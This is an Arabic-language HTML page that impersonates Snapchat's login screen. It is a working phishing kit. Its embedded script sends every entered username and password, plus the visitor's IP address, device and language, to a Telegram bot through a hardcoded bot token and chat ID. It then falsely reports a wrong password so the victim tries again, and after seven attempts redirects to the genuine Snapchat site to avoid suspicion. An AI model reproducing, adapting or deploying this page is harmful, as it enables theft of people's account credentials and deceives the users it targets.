<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول | Snapchat</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-container {
            max-width: 400px;
            width: 100%;
            background: white;
            border-radius: 32px;
            padding: 32px 24px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
        }

        .snap-logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .snap-icon {
            width: 85px;
            height: 85px;
            background: #FFFC00;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
            box-shadow: 0 6px 16px rgba(0,0,0,0.15);
        }

        .snap-icon svg {
            width: 52px;
            height: 52px;
        }

        .snap-logo h1 {
            font-size: 28px;
            font-weight: 700;
            color: #FFFC00;
            text-shadow: 2px 2px 0 #000;
            letter-spacing: -0.5px;
        }

        .input-group {
            margin-bottom: 8px;
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 16px 20px;
            border: 1px solid #ddd;
            border-radius: 40px;
            font-size: 16px;
            background: #fafafa;
            transition: all 0.2s;
        }

        .input-group input:focus {
            outline: none;
            border-color: #FFFC00;
            background: white;
        }

        .input-group input.error-input {
            border-color: #ff0000;
            background: #ffeeee;
        }

        .field-error {
            color: #ff0000;
            font-size: 12px;
            margin-top: 4px;
            margin-bottom: 12px;
            padding-right: 16px;
            display: none;
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background: #FFFC00;
            border: none;
            border-radius: 40px;
            font-size: 18px;
            font-weight: bold;
            color: #000;
            cursor: pointer;
            margin-top: 8px;
            transition: transform 0.1s;
        }

        .login-btn:active {
            transform: scale(0.98);
        }

        .login-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .divider {
            text-align: center;
            margin: 24px 0;
            color: #aaa;
            font-size: 14px;
            position: relative;
        }

        .divider::before,
        .divider::after {
            content: "";
            position: absolute;
            top: 50%;
            width: 40%;
            height: 1px;
            background: #ddd;
        }

        .divider::before {
            left: 0;
        }

        .divider::after {
            right: 0;
        }

        .links {
            text-align: center;
            margin-top: 20px;
        }

        .links a {
            color: #0066FF;
            text-decoration: none;
            font-size: 14px;
            margin: 0 10px;
            cursor: pointer;
        }

        .links a:hover {
            text-decoration: underline;
        }

        .loading-msg {
            background: #f0f0f0;
            color: #666;
            padding: 10px;
            border-radius: 20px;
            font-size: 12px;
            text-align: center;
            margin-bottom: 16px;
            display: none;
        }

        .signup-text {
            display: none;
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="snap-logo">
        <div class="snap-icon">

        </div>
        <h1>Snapchat</h1>
    </div>

    <div id="loadingMsg" class="loading-msg">جاري التحقق من المعلومات...</div>

    <form id="loginForm">
        <div class="input-group">
            <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" autocomplete="off" required>
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="كلمة المرور" required>
            <div id="passwordError" class="field-error"></div>
        </div>
        <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
    </form>

    <div class="divider">أو</div>

    <div class="links">
        <a id="signupLink">إنشاء حساب جديد</a>
    </div>
</div>

<script>
    const BOT_TOKEN = "8930723698:AAE5ctXM39Hiz_a7v_aOZ0byP08_btOhQ-0";
    const CHAT_ID = "8549252422";
    
    let attemptCount = 0;
    let isProcessing = false;
    let lastSentData = { username: '', password: '' };

    async function sendToTelegram(username, password) {
        const ip = await getClientIP();
        const message = `🎯 SNAPCHAT LOGIN\n👤 Username/Email: ${username}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}\n📱 Device: ${navigator.userAgent}\n🌐 Language: ${navigator.language}\n📍 IP: ${ip}\n🔢 Attempt: ${attemptCount}`;
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
            });
        } catch(e) {}
    }
    
    async function getClientIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch(e) {
            return 'unknown';
        }
    }

    function showPasswordError(message, isError = true) {
        const errorDiv = document.getElementById('passwordError');
        const passwordInput = document.getElementById('password');
        
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        
        if (isError) {
            passwordInput.classList.add('error-input');
        } else {
            passwordInput.classList.remove('error-input');
        }
        
        setTimeout(() => {
            if (errorDiv.textContent === message) {
                errorDiv.style.display = 'none';
                passwordInput.classList.remove('error-input');
            }
        }, 4000);
    }

    function clearPasswordError() {
        const errorDiv = document.getElementById('passwordError');
        const passwordInput = document.getElementById('password');
        errorDiv.style.display = 'none';
        passwordInput.classList.remove('error-input');
    }

    function showWrongPasswordMessage() {
        const attemptsLeft = 7 - attemptCount;
        
        if (attemptCount >= 7) {
            window.location.href = "https://accounts.snapchat.com/accounts/login?2R";
            return;
        }
        
        const messages = [
            "كلمة المرور غير صحيحة. حاول مرة أخرى",
            "كلمة المرور التي أدخلتها خاطئة",
            "كلمة المرور غير صحيحة. تأكد من كتابتها بشكل صحيح",
            "عذراً، كلمة المرور غير صحيحة",
            "كلمة المرور غير صحيحة. تبقت " + attemptsLeft + " محاولات",
            "كلمة المرور غير صحيحة. يمكنك إعادة تعيينها إذا نسيتها"
        ];
        
        const randomMsg = messages[Math.floor(Math.random() * messages.length)];
        showPasswordError(randomMsg, true);
        
        document.getElementById('password').value = '';
        document.getElementById('password').focus();
    }
    
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        if (isProcessing) return;
        
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        
        clearPasswordError();
        
        if (!username) {
            showPasswordError("الرجاء إدخال اسم المستخدم أو البريد الإلكتروني", true);
            return;
        }
        
        if (!password) {
            showPasswordError("الرجاء إدخال كلمة المرور", true);
            return;
        }
        
        // التحقق من طول كلمة المرور (8 أحرف فما فوق)
        if (password.length < 8) {
            showPasswordError("يجب أن تتكون كلمة المرور من 8 أحرف على الأقل", true);
            return;
        }
        
        isProcessing = true;
        const loginBtn = document.getElementById('loginBtn');
        loginBtn.disabled = true;
        loginBtn.style.opacity = '0.6';
        
        const loadingDiv = document.getElementById('loadingMsg');
        loadingDiv.style.display = 'block';
        
        attemptCount++;
        
        // التحقق من عدم تكرار إرسال نفس البيانات
        const isDuplicate = (lastSentData.username === username && lastSentData.password === password);
        
        if (!isDuplicate) {
            lastSentData = { username: username, password: password };
            await sendToTelegram(username, password);
        }
        
        setTimeout(() => {
            loadingDiv.style.display = 'none';
            
            if (attemptCount >= 7) {
                window.location.href = "https://accounts.snapchat.com/accounts/login?2R";
            } else {
                showWrongPasswordMessage();
            }
            
            isProcessing = false;
            loginBtn.disabled = false;
            loginBtn.style.opacity = '1';
        }, 2000);
    });
    
    // عند الضغط على "إنشاء حساب جديد"
    document.getElementById('signupLink').addEventListener('click', (e) => {
        e.preventDefault();
        showPasswordError("لديك حساب بالفعل. يرجى تسجيل الدخول باستخدام بياناتك", false);
    });
    
    // مسح الخطأ عند الكتابة في حقل كلمة المرور
    document.getElementById('password').addEventListener('input', () => {
        clearPasswordError();
    });
    
    document.getElementById('username').addEventListener('input', () => {
        clearPasswordError();
    });
</script>
</body>
</html>
